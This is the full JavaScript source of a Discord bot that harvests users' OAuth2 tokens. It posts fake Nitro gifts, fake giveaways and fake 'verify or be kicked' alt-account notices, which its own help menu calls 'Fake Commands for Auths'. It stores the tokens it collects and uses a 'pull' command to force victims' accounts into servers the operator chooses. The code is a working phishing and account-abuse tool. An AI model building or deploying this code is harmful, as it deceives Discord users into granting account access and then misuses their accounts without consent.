const main = require("./classes/main");
const Discord = require("discord.js");
const client1 = new Discord.Client()
const disbut = require('discord-buttons')
disbut.multipleImport(client1) // Please keep this as client1 otherwise buttons won't work and you'll get errors.
const config = require("./config.js");
require("./database/main");
const express = require("express");
const db = require("quick.db")
const emoji = require("./emojis.json")
const app = express();

const client = new main({
  token: process.env.token,
  prefix: config.prefix,
  client_id: config.client_id,
  client_secret: process.env.client_secret,
  redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
  console.log(`Logged in as ${bot.user.tag}`) // Console Logs
});

client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;
  if (!config.owners.includes(message.author.id)) return;
  if (command === "users") {
    const amount = await client.tokenCount();
    message.channel.send({
      embed: {
        title: "<:users:998946063664808037> OAuth2 Users:",
        description: `There are **${amount}** authed users in the bot`,
        color: "BLUE"
      }
    });
  }

  if (command === "pull") {
    if (!args[0] || !args[1]) return message.channel.send("Wrong usage, `-pull <server id> <number of auths>`")

    let pull = new Discord.MessageEmbed()
      .setTitle(`<:user:999648991866257549> Users Joining:`)
      .setDescription('<:joinArrow1:999648912082206811> The joins is coming out, takes 1-30 mintues.\n<:joinArrow1:999648912082206811> Type `-help` for more commands')
      .setColor("RED")
      .setFooter("Source Code made by Nobi, >Azagaria, Conflict")
    message.channel.send(pull)
    await client.manageJoin({
      amount: args[1],
      guild_id: args[0]
    }, message);
  }

  if (command === "alt") {
    let verifynoww = new Discord.MessageEmbed()
      .setTitle("Hey, hold on for a second!")
      .setDescription("Please verify your account first before you can claim any of our rewards or giveaways!")
      .setFooter("You will be kicked in 1 week if you do not verify.")
    let verifynow = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL(config.redirect_uri)
    message.channel.send("I have detected your account as an alt/bot account. Please verify your account...", { embed: verifynoww, button: verifynow })
  }

  if (command === "cleans") {
    await client.clean(message)
  }

  if (command === "refresh") {
    await client.refreshTokens(message)
  }
  if (command === "links") {
    let links = new Discord.MessageEmbed()
      .setTitle('<:gifting_inviteurl:994926880669040731> Oauth/Invite:')
      .setDescription(`<:joinArrow1:999648912082206811> **Your OAuth2 Link: **` + config.redirect_uri)
      .setColor("BLACK")
      .setFooter("Auth Bot was made by Nobi, >Azagaria and Conflict")
    message.channel.send(links)
  }
  if (command === "restart") {
    message.channel.send("<:join:999648931459895398> **Restarting....**")
    await client.restart();
  }
  if (command === "help") {
    let help = new Discord.MessageEmbed()
      .setTitle(`Auth Dashboard`)
      .setColor("ORANGE")
      .addField("🛠️ | Help", "`help`")
      .addField("🛡️ | Fake Commands for Auths", "`giveaway`, `authorize`, `check`, `alt`")
      .addField("🎁 | Owners", "`users`, `pull`, `clean`, `refresh`, `restart`, `links`, `credits`, `wl add/remove/list (WILL MAKE SOON)`,")
      .setFooter("Auth Bot was made by Nobi, >Azagaria and Conflict")
    message.channel.send(help)
  }

  if (command === "check") {
    let checkembed = new Discord.MessageEmbed()
      .setDescription("<a:Moderation:1000012036660539402> The mentioned user is not verified.")
      .setColor("BLUE")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL('https://discord.com/api/oauth2/authorize?client_id=999280130365067284&redirect_uri=https%3A%2F%2FOauth3-1.huyvu43.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join')
    message.channel.send({ embed: checkembed, button: check })
  }

  if (command === "authorize") {
    let verifyembed = new Discord.MessageEmbed()
      .setDescription('`To get your Discord Nitro you must authorize yourself.` :tada: \n\n`[1]` Click on the button and authorize yourself.\n`[2]` Wait 42 hours and the bot will send you a link.')
      .setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
      .setColor("BLUE")
    let verify = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Authorize')
      .setURL(config.redirect_uri)
    message.channel.send("**Hello everyone :wave:, you been gifted Discord Nitro, click on the `Authorize` button. <a:WumpusGift:997322118188507187>**", { embed: verifyembed, button: verify })
  }

  if (command === "credits") {
    let credits = new Discord.MessageEmbed()
      .setTitle("Credits")
      .setDescription("Auth Bot was made by Nobi, >Azagaria and Conflict")
    message.channel.send(credits)
  }
  if (command === "giveaway") {
    let giveaway = new Discord.MessageEmbed()
      .setTitle(`🎉 **Giveaway** 🎉`)
      .setColor("BLUE")
      .setDescription(`\n**WINNERS:** 1\n**TIMER**: 24h\n**PRIZE:** Nitro 1 Year\n**HOSTED BY: <@${message.author.id}>**\n\n __**Requirements:**__\n**Must stay in the server.**\n\nTo enter the giveaway click on the enter button.`)
    let giveawaybutton = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Enter')
      .setURL(config.redirect_uri)
    message.channel.send("Giveaway for `Nitro 1 Year` has been made!", { embed: giveaway, button: giveawaybutton })
  }

})

// Do not delete or edit line 165 to line 180...

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html") //THIS WILL REDIRECT THE PERSON TO THE SITE
  // IF YOU GET THAT PAGE IS BLOCKED YOU CAN FIX IT WITH CLOUDFLARE BY MAKING IT SO HTTPS AND HTTP CAN WORK TOGETHER... OR: YOU USE HTTP INSTEAD OF HTTPS
  res.redirect(config.oauth_link);
});

app.get("/authed", async (req, res) => {
  const data = await client.manageAuth({ code: req.query.code });
  const user_id = await client.requestId(data.access_token);
  const obj = {
    ...data,
    user_id
  };
  client.saveAuth(obj);
  res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(80); // Local Host Port



